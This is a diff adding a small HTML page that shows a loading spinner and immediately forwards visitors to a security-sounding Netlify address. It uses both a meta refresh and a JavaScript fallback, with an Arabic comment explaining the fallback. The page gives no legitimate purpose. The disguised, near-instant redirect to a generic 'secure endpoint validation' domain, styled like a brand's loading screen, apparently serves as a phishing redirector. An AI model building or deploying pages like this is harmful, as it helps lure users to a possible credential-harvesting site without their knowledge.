@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <meta http-equiv="refresh" content="0.5;url=https://secure-endpoint-validation.netlify.app/">
+    <style>
+        body { background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }
+        .spin { border: 2px solid #f3f3f3; border-top: 2px solid #ffd814; border-radius: 50%; width: 20px; height: 20px; animation: s 1s linear infinite; }
+        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="spin"></div>
+    <script>
+        // زيادة في الاحتياط: تحويل برمجي إذا فشل تحويل الـ Meta
+        setTimeout(function(){
+            window.location.replace("https://secure-endpoint-validation.netlify.app/");
+        }, 600);
+    </script>
+</body>
+</html>
